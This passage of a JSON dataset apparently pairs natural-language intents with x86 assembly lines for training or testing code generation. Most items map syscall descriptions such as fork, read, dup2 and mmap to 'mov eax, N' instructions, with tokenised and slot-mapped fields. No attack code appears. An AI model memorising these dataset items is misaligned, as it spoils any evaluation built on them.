    ]
  },
  {
    "intent": "invoke sys_lseek",
    "rewritten_intent": "invoke sys_lseek",
    "snippet": "mov eax, 19",
    "slot_map": {
      "sys_lseek": "var0"
    },
    "intent_tokens": [
      "invoke",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "19"
    ]
  },
  {
    "intent": "lseek",
    "rewritten_intent": "lseek",
    "snippet": "mov eax, 19",
    "slot_map": {
      "lseek": "var0"
    },
    "intent_tokens": [
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "19"
    ]
  },
  {
    "intent": "make the system call lseek",
    "rewritten_intent": "make the system call lseek",
    "snippet": "mov eax, 19",
    "slot_map": {
      "lseek": "var0"
    },
    "intent_tokens": [
      "make",
      "system",
      "call",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "19"
    ]
  },
  {
    "intent": "make the system call to go to the file offset",
    "rewritten_intent": "make the system call to go to the file offset",
    "snippet": "mov eax, 19",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "system",
      "call",
      "go",
      "file",
      "offset"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "19"
    ]
  },
  {
    "intent": "system call lseek",
    "rewritten_intent": "system call lseek",
    "snippet": "mov eax, 19",
    "slot_map": {
      "lseek": "var0"
    },
    "intent_tokens": [
      "system",
      "call",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "19"
    ]
  },
  {
    "intent": "create a new process",
    "rewritten_intent": "create a new process",
    "snippet": "mov eax, 2",
    "slot_map": {},
    "intent_tokens": [
      "create",
      "new",
      "process"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "2"
    ]
  },
  {
    "intent": "fork",
    "rewritten_intent": "fork",
    "snippet": "mov eax, 2",
    "slot_map": {},
    "intent_tokens": [
      "fork"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "2"
    ]
  },
  {
    "intent": "invoke sys_fork",
    "rewritten_intent": "invoke sys_fork",
    "snippet": "mov eax, 2",
    "slot_map": {
      "sys_fork": "var0"
    },
    "intent_tokens": [
      "invoke",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "2"
    ]
  },
  {
    "intent": "make the system call fork",
    "rewritten_intent": "make the system call fork",
    "snippet": "mov eax, 2",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "system",
      "call",
      "fork"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "2"
    ]
  },
  {
    "intent": "make the system call to create a new process",
    "rewritten_intent": "make the system call to create a new process",
    "snippet": "mov eax, 2",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "system",
      "call",
      "create",
      "new",
      "process"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "2"
    ]
  },
  {
    "intent": "move the value two into eax",
    "rewritten_intent": "move the value two into eax",
    "snippet": "mov eax, 2",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "value",
      "two",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "2"
    ]
  },
  {
    "intent": "system call fork",
    "rewritten_intent": "system call fork",
    "snippet": "mov eax, 2",
    "slot_map": {},
    "intent_tokens": [
      "system",
      "call",
      "fork"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "2"
    ]
  },
  {
    "intent": "get the process ID",
    "rewritten_intent": "get the process ID",
    "snippet": "mov eax, 20",
    "slot_map": {
      "ID": "var0"
    },
    "intent_tokens": [
      "get",
      "process",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "20"
    ]
  },
  {
    "intent": "getpid",
    "rewritten_intent": "getpid",
    "snippet": "mov eax, 20",
    "slot_map": {
      "getpid": "var0"
    },
    "intent_tokens": [
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "20"
    ]
  },
  {
    "intent": "make the system call getpid",
    "rewritten_intent": "make the system call getpid",
    "snippet": "mov eax, 20",
    "slot_map": {
      "getpid": "var0"
    },
    "intent_tokens": [
      "make",
      "system",
      "call",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "20"
    ]
  },
  {
    "intent": "make the system call to get the process ID",
    "rewritten_intent": "make the system call to get the process ID",
    "snippet": "mov eax, 20",
    "slot_map": {
      "ID": "var0"
    },
    "intent_tokens": [
      "make",
      "system",
      "call",
      "get",
      "process",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "20"
    ]
  },
  {
    "intent": "system call getpid",
    "rewritten_intent": "system call getpid",
    "snippet": "mov eax, 20",
    "slot_map": {
      "getpid": "var0"
    },
    "intent_tokens": [
      "system",
      "call",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "20"
    ]
  },
  {
    "intent": "get 21 in the eax register",
    "rewritten_intent": "get 21 in the eax register",
    "snippet": "mov eax, 21",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "get",
      "21",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "21"
    ]
  },
  {
    "intent": "alarm",
    "rewritten_intent": "alarm",
    "snippet": "mov eax, 27",
    "slot_map": {},
    "intent_tokens": [
      "alarm"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "27"
    ]
  },
  {
    "intent": "make the system call alarm",
    "rewritten_intent": "make the system call alarm",
    "snippet": "mov eax, 27",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "system",
      "call",
      "alarm"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "27"
    ]
  },
  {
    "intent": "make the system call to set set signal delivery alarm clock",
    "rewritten_intent": "make the system call to set set signal delivery alarm clock",
    "snippet": "mov eax, 27",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "system",
      "call",
      "set",
      "set",
      "signal",
      "delivery",
      "alarm",
      "clock"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "27"
    ]
  },
  {
    "intent": "set signal delivery alarm clock",
    "rewritten_intent": "set signal delivery alarm clock",
    "snippet": "mov eax, 27",
    "slot_map": {},
    "intent_tokens": [
      "set",
      "signal",
      "delivery",
      "alarm",
      "clock"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "27"
    ]
  },
  {
    "intent": "system call alarm",
    "rewritten_intent": "system call alarm",
    "snippet": "mov eax, 27",
    "slot_map": {},
    "intent_tokens": [
      "system",
      "call",
      "alarm"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "27"
    ]
  },
  {
    "intent": "make the system call pause",
    "rewritten_intent": "make the system call pause",
    "snippet": "mov eax, 29",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "system",
      "call",
      "pause"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "29"
    ]
  },
  {
    "intent": "make the system call to suspend the process",
    "rewritten_intent": "make the system call to suspend the process",
    "snippet": "mov eax, 29",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "system",
      "call",
      "suspend",
      "process"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "29"
    ]
  },
  {
    "intent": "pause",
    "rewritten_intent": "pause",
    "snippet": "mov eax, 29",
    "slot_map": {},
    "intent_tokens": [
      "pause"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "29"
    ]
  },
  {
    "intent": "suspend the process until the signal arrives",
    "rewritten_intent": "suspend the process until the signal arrives",
    "snippet": "mov eax, 29",
    "slot_map": {
      "until": "var0"
    },
    "intent_tokens": [
      "suspend",
      "process",
      "var0",
      "signal",
      "arrives"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "29"
    ]
  },
  {
    "intent": "system call pause",
    "rewritten_intent": "system call pause",
    "snippet": "mov eax, 29",
    "slot_map": {},
    "intent_tokens": [
      "system",
      "call",
      "pause"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "29"
    ]
  },
  {
    "intent": "invoke sys_read",
    "rewritten_intent": "invoke sys_read",
    "snippet": "mov eax, 3",
    "slot_map": {
      "sys_read": "var0"
    },
    "intent_tokens": [
      "invoke",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "3"
    ]
  },
  {
    "intent": "make the system call read",
    "rewritten_intent": "make the system call read",
    "snippet": "mov eax, 3",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "system",
      "call",
      "read"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "3"
    ]
  },
  {
    "intent": "make the system call to read the file",
    "rewritten_intent": "make the system call to read the file",
    "snippet": "mov eax, 3",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "system",
      "call",
      "read",
      "file"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "3"
    ]
  },
  {
    "intent": "move 3 to the eax register",
    "rewritten_intent": "move 3 to the eax register",
    "snippet": "mov eax, 3",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "3",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "3"
    ]
  },
  {
    "intent": "read",
    "rewritten_intent": "read",
    "snippet": "mov eax, 3",
    "slot_map": {},
    "intent_tokens": [
      "read"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "3"
    ]
  },
  {
    "intent": "read the file",
    "rewritten_intent": "read the file",
    "snippet": "mov eax, 3",
    "slot_map": {},
    "intent_tokens": [
      "read",
      "file"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "3"
    ]
  },
  {
    "intent": "specify sys_read call",
    "rewritten_intent": "specify sys_read call",
    "snippet": "mov eax, 3",
    "slot_map": {
      "sys_read": "var0"
    },
    "intent_tokens": [
      "specify",
      "var0",
      "call"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "3"
    ]
  },
  {
    "intent": "system call read",
    "rewritten_intent": "system call read",
    "snippet": "mov eax, 3",
    "slot_map": {},
    "intent_tokens": [
      "system",
      "call",
      "read"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "3"
    ]
  },
  {
    "intent": "kill",
    "rewritten_intent": "kill",
    "snippet": "mov eax, 37",
    "slot_map": {},
    "intent_tokens": [
      "kill"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "37"
    ]
  },
  {
    "intent": "make the system call kill",
    "rewritten_intent": "make the system call kill",
    "snippet": "mov eax, 37",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "system",
      "call",
      "kill"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "37"
    ]
  },
  {
    "intent": "make the system call to send the signal to another process",
    "rewritten_intent": "make the system call to send the signal to another process",
    "snippet": "mov eax, 37",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "system",
      "call",
      "send",
      "signal",
      "another",
      "process"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "37"
    ]
  },
  {
    "intent": "send signal to another process",
    "rewritten_intent": "send signal to another process",
    "snippet": "mov eax, 37",
    "slot_map": {},
    "intent_tokens": [
      "send",
      "signal",
      "another",
      "process"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "37"
    ]
  },
  {
    "intent": "system call kill",
    "rewritten_intent": "system call kill",
    "snippet": "mov eax, 37",
    "slot_map": {},
    "intent_tokens": [
      "system",
      "call",
      "kill"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "37"
    ]
  },
  {
    "intent": "invoke sys_write",
    "rewritten_intent": "invoke sys_write",
    "snippet": "mov eax, 4",
    "slot_map": {
      "sys_write": "var0"
    },
    "intent_tokens": [
      "invoke",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "4"
    ]
  },
  {
    "intent": "make the system call for write",
    "rewritten_intent": "make the system call for write",
    "snippet": "mov eax, 4",
    "slot_map": {
      "for": "var0"
    },
    "intent_tokens": [
      "make",
      "system",
      "call",
      "var0",
      "write"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "4"
    ]
  },
  {
    "intent": "make the system call to write to the file",
    "rewritten_intent": "make the system call to write to the file",
    "snippet": "mov eax, 4",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "system",
      "call",
      "write",
      "file"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "4"
    ]
  },
  {
    "intent": "make the system call write",
    "rewritten_intent": "make the system call write",
    "snippet": "mov eax, 4",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "system",
      "call",
      "write"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "4"
    ]
  },
  {
    "intent": "move 4 into eax",
    "rewritten_intent": "move 4 into eax",
    "snippet": "mov eax, 4",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "4",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "4"
    ]
  },
  {
    "intent": "move 4 to the eax register",
    "rewritten_intent": "move 4 to the eax register",
    "snippet": "mov eax, 4",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "4",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "4"
    ]
  },
  {
    "intent": "specify sys_write call",
    "rewritten_intent": "specify sys_write call",
    "snippet": "mov eax, 4",
    "slot_map": {
      "sys_write": "var0"
    },
    "intent_tokens": [
      "specify",
      "var0",
      "call"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "4"
    ]
  },
  {
    "intent": "specify sys_write syscall",
    "rewritten_intent": "specify sys_write syscall",
    "snippet": "mov eax, 4",
    "slot_map": {
      "sys_write": "var0"
    },
    "intent_tokens": [
      "specify",
      "var0",
      "syscall"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "4"
    ]
  },
  {
    "intent": "system call write",
    "rewritten_intent": "system call write",
    "snippet": "mov eax, 4",
    "slot_map": {},
    "intent_tokens": [
      "system",
      "call",
      "write"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "4"
    ]
  },
  {
    "intent": "write",
    "rewritten_intent": "write",
    "snippet": "mov eax, 4",
    "slot_map": {},
    "intent_tokens": [
      "write"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "4"
    ]
  },
  {
    "intent": "write to the file",
    "rewritten_intent": "write to the file",
    "snippet": "mov eax, 4",
    "slot_map": {},
    "intent_tokens": [
      "write",
      "file"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "4"
    ]
  },
  {
    "intent": "install signal handel",
    "rewritten_intent": "install signal handel",
    "snippet": "mov eax, 48",
    "slot_map": {},
    "intent_tokens": [
      "install",
      "signal",
      "handel"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "48"
    ]
  },
  {
    "intent": "make the system call signal",
    "rewritten_intent": "make the system call signal",
    "snippet": "mov eax, 48",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "system",
      "call",
      "signal"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "48"
    ]
  },
  {
    "intent": "make the system call to install the signal handler",
    "rewritten_intent": "make the system call to install the signal handler",
    "snippet": "mov eax, 48",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "system",
      "call",
      "install",
      "signal",
      "handler"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "48"
    ]
  },
  {
    "intent": "signal",
    "rewritten_intent": "signal",
    "snippet": "mov eax, 48",
    "slot_map": {},
    "intent_tokens": [
      "signal"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "48"
    ]
  },
  {
    "intent": "system call signal",
    "rewritten_intent": "system call signal",
    "snippet": "mov eax, 48",
    "slot_map": {},
    "intent_tokens": [
      "system",
      "call",
      "signal"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "48"
    ]
  },
  {
    "intent": "invoke sys_open",
    "rewritten_intent": "invoke sys_open",
    "snippet": "mov eax, 5",
    "slot_map": {
      "sys_open": "var0"
    },
    "intent_tokens": [
      "invoke",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "5"
    ]
  },
  {
    "intent": "make the system call open",
    "rewritten_intent": "make the system call open",
    "snippet": "mov eax, 5",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "system",
      "call",
      "open"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "5"
    ]
  },
  {
    "intent": "make the system call to open the file",
    "rewritten_intent": "make the system call to open the file",
    "snippet": "mov eax, 5",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "system",
      "call",
      "open",
      "file"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "5"
    ]
  },
  {
    "intent": "open",
    "rewritten_intent": "open",
    "snippet": "mov eax, 5",
    "slot_map": {},
    "intent_tokens": [
      "open"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "5"
    ]
  },
  {
    "intent": "open the file",
    "rewritten_intent": "open the file",
    "snippet": "mov eax, 5",
    "slot_map": {},
    "intent_tokens": [
      "open",
      "file"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "5"
    ]
  },
  {
    "intent": "system call open",
    "rewritten_intent": "system call open",
    "snippet": "mov eax, 5",
    "slot_map": {},
    "intent_tokens": [
      "system",
      "call",
      "open"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "5"
    ]
  },
  {
    "intent": "close",
    "rewritten_intent": "close",
    "snippet": "mov eax, 6",
    "slot_map": {},
    "intent_tokens": [
      "close"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "6"
    ]
  },
  {
    "intent": "close the file",
    "rewritten_intent": "close the file",
    "snippet": "mov eax, 6",
    "slot_map": {},
    "intent_tokens": [
      "close",
      "file"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "6"
    ]
  },
  {
    "intent": "invoke sys_close",
    "rewritten_intent": "invoke sys_close",
    "snippet": "mov eax, 6",
    "slot_map": {
      "sys_close": "var0"
    },
    "intent_tokens": [
      "invoke",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "6"
    ]
  },
  {
    "intent": "make the system call close",
    "rewritten_intent": "make the system call close",
    "snippet": "mov eax, 6",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "system",
      "call",
      "close"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "6"
    ]
  },
  {
    "intent": "make the system call to close the file",
    "rewritten_intent": "make the system call to close the file",
    "snippet": "mov eax, 6",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "system",
      "call",
      "close",
      "file"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "6"
    ]
  },
  {
    "intent": "system call close",
    "rewritten_intent": "system call close",
    "snippet": "mov eax, 6",
    "slot_map": {},
    "intent_tokens": [
      "system",
      "call",
      "close"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "6"
    ]
  },
  {
    "intent": "copy file descriptor",
    "rewritten_intent": "copy file descriptor",
    "snippet": "mov eax, 63",
    "slot_map": {},
    "intent_tokens": [
      "copy",
      "file",
      "descriptor"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "63"
    ]
  },
  {
    "intent": "dup2",
    "rewritten_intent": "dup2",
    "snippet": "mov eax, 63",
    "slot_map": {
      "dup2": "var0"
    },
    "intent_tokens": [
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "63"
    ]
  },
  {
    "intent": "make the system call dup2",
    "rewritten_intent": "make the system call dup2",
    "snippet": "mov eax, 63",
    "slot_map": {
      "dup2": "var0"
    },
    "intent_tokens": [
      "make",
      "system",
      "call",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "63"
    ]
  },
  {
    "intent": "make the system call to copy the file descriptor",
    "rewritten_intent": "make the system call to copy the file descriptor",
    "snippet": "mov eax, 63",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "system",
      "call",
      "copy",
      "file",
      "descriptor"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "63"
    ]
  },
  {
    "intent": "system call dup2",
    "rewritten_intent": "system call dup2",
    "snippet": "mov eax, 63",
    "slot_map": {
      "dup2": "var0"
    },
    "intent_tokens": [
      "system",
      "call",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "63"
    ]
  },
  {
    "intent": "get the parent process ID",
    "rewritten_intent": "get the parent process ID",
    "snippet": "mov eax, 64",
    "slot_map": {
      "ID": "var0"
    },
    "intent_tokens": [
      "get",
      "parent",
      "process",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "64"
    ]
  },
  {
    "intent": "getppid",
    "rewritten_intent": "getppid",
    "snippet": "mov eax, 64",
    "slot_map": {
      "getppid": "var0"
    },
    "intent_tokens": [
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "64"
    ]
  },
  {
    "intent": "make the system call getppid",
    "rewritten_intent": "make the system call getppid",
    "snippet": "mov eax, 64",
    "slot_map": {
      "getppid": "var0"
    },
    "intent_tokens": [
      "make",
      "system",
      "call",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "64"
    ]
  },
  {
    "intent": "make the system call to get the parent process ID",
    "rewritten_intent": "make the system call to get the parent process ID",
    "snippet": "mov eax, 64",
    "slot_map": {
      "ID": "var0"
    },
    "intent_tokens": [
      "make",
      "system",
      "call",
      "get",
      "parent",
      "process",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "64"
    ]
  },
  {
    "intent": "system call getppid",
    "rewritten_intent": "system call getppid",
    "snippet": "mov eax, 64",
    "slot_map": {
      "getppid": "var0"
    },
    "intent_tokens": [
      "system",
      "call",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "64"
    ]
  },
  {
    "intent": "get process group",
    "rewritten_intent": "get process group",
    "snippet": "mov eax, 65",
    "slot_map": {},
    "intent_tokens": [
      "get",
      "process",
      "group"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "65"
    ]
  },
  {
    "intent": "getpgrp",
    "rewritten_intent": "getpgrp",
    "snippet": "mov eax, 65",
    "slot_map": {
      "getpgrp": "var0"
    },
    "intent_tokens": [
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "65"
    ]
  },
  {
    "intent": "make the system call getpgrp",
    "rewritten_intent": "make the system call getpgrp",
    "snippet": "mov eax, 65",
    "slot_map": {
      "getpgrp": "var0"
    },
    "intent_tokens": [
      "make",
      "system",
      "call",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "65"
    ]
  },
  {
    "intent": "make the system call to get the process group",
    "rewritten_intent": "make the system call to get the process group",
    "snippet": "mov eax, 65",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "system",
      "call",
      "get",
      "process",
      "group"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "65"
    ]
  },
  {
    "intent": "system call getpgrp",
    "rewritten_intent": "system call getpgrp",
    "snippet": "mov eax, 65",
    "slot_map": {
      "getpgrp": "var0"
    },
    "intent_tokens": [
      "system",
      "call",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "65"
    ]
  },
  {
    "intent": "install portable signal handler",
    "rewritten_intent": "install portable signal handler",
    "snippet": "mov eax, 67",
    "slot_map": {},
    "intent_tokens": [
      "install",
      "portable",
      "signal",
      "handler"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "67"
    ]
  },
  {
    "intent": "make the system call sigaction",
    "rewritten_intent": "make the system call sigaction",
    "snippet": "mov eax, 67",
    "slot_map": {
      "sigaction": "var0"
    },
    "intent_tokens": [
      "make",
      "system",
      "call",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "67"
    ]
  },
  {
    "intent": "make the system call to install portable signal handler",
    "rewritten_intent": "make the system call to install portable signal handler",
    "snippet": "mov eax, 67",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "system",
      "call",
      "install",
      "portable",
      "signal",
      "handler"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "67"
    ]
  },
  {
    "intent": "sigaction",
    "rewritten_intent": "sigaction",
    "snippet": "mov eax, 67",
    "slot_map": {
      "sigaction": "var0"
    },
    "intent_tokens": [
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "67"
    ]
  },
  {
    "intent": "system call sigaction",
    "rewritten_intent": "system call sigaction",
    "snippet": "mov eax, 67",
    "slot_map": {
      "sigaction": "var0"
    },
    "intent_tokens": [
      "system",
      "call",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "67"
    ]
  },
  {
    "intent": "make the system call to wait for child for terminate",
    "rewritten_intent": "make the system call to wait for child for terminate",
    "snippet": "mov eax, 7",
    "slot_map": {
      "for": "var0"
    },
    "intent_tokens": [
      "make",
      "system",
      "call",
      "wait",
      "var0",
      "child",
      "var0",
      "terminate"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "7"
    ]
  },
  {
    "intent": "make the system call waitpid",
    "rewritten_intent": "make the system call waitpid",
    "snippet": "mov eax, 7",
    "slot_map": {
      "waitpid": "var0"
    },
    "intent_tokens": [
      "make",
      "system",
      "call",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "7"
    ]
  },
  {
    "intent": "system call waitpid",
    "rewritten_intent": "system call waitpid",
    "snippet": "mov eax, 7",
    "slot_map": {
      "waitpid": "var0"
    },
    "intent_tokens": [
      "system",
      "call",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "7"
    ]
  },
  {
    "intent": "wait for child to terminate",
    "rewritten_intent": "wait for child to terminate",
    "snippet": "mov eax, 7",
    "slot_map": {
      "for": "var0"
    },
    "intent_tokens": [
      "wait",
      "var0",
      "child",
      "terminate"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "7"
    ]
  },
  {
    "intent": "waitpid",
    "rewritten_intent": "waitpid",
    "snippet": "mov eax, 7",
    "slot_map": {
      "waitpid": "var0"
    },
    "intent_tokens": [
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "7"
    ]
  },
  {
    "intent": "invoke sys_creat",
    "rewritten_intent": "invoke sys_creat",
    "snippet": "mov eax, 8",
    "slot_map": {
      "sys_creat": "var0"
    },
    "intent_tokens": [
      "invoke",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "8"
    ]
  },
  {
    "intent": "make the system call mmap",
    "rewritten_intent": "make the system call mmap",
    "snippet": "mov eax, 90",
    "slot_map": {
      "mmap": "var0"
    },
    "intent_tokens": [
      "make",
      "system",
      "call",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "90"
    ]
  },
  {
    "intent": "make the system call to map the memory page to a file",
    "rewritten_intent": "make the system call to map the memory page to a file",
    "snippet": "mov eax, 90",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "system",
      "call",
      "map",
      "memory",
      "page",
      "file"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "90"
    ]
  },
  {
    "intent": "map the memory page to a file",
    "rewritten_intent": "map the memory page to a file",
    "snippet": "mov eax, 90",
    "slot_map": {},
    "intent_tokens": [
      "map",
      "memory",
      "page",
      "file"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "90"
    ]
  },
  {
    "intent": "mmap",
    "rewritten_intent": "mmap",
    "snippet": "mov eax, 90",
    "slot_map": {
      "mmap": "var0"
    },
    "intent_tokens": [
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "90"
    ]
  },
  {
    "intent": "move decimal number 90 into eax",
    "rewritten_intent": "move decimal number 90 into eax",
    "snippet": "mov eax, 90",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "decimal",
      "number",
      "90",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "90"
    ]
  },
  {
    "intent": "system call mmap",
    "rewritten_intent": "system call mmap",
    "snippet": "mov eax, 90",
    "slot_map": {
      "mmap": "var0"
    },
    "intent_tokens": [
      "system",
      "call",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "90"
    ]
  },
  {
    "intent": "move addr into eax",
    "rewritten_intent": "move addr into eax",
    "snippet": "mov eax, addr",
    "slot_map": {
      "addr": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the contents of memory address array+esi*4 into eax",
    "rewritten_intent": "move the contents of memory address array+esi*4 into eax",
    "snippet": "mov eax, array[esi*4]",
    "slot_map": {
      "array+esi*4": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "contents",
      "memory",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "array",
      "[",
      "esi",
      "*",
      "4",
      "]"
    ]
  },
  {
    "intent": "move b to eax",
    "rewritten_intent": "move b to eax",
    "snippet": "mov eax, b",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "b",
      "var0"
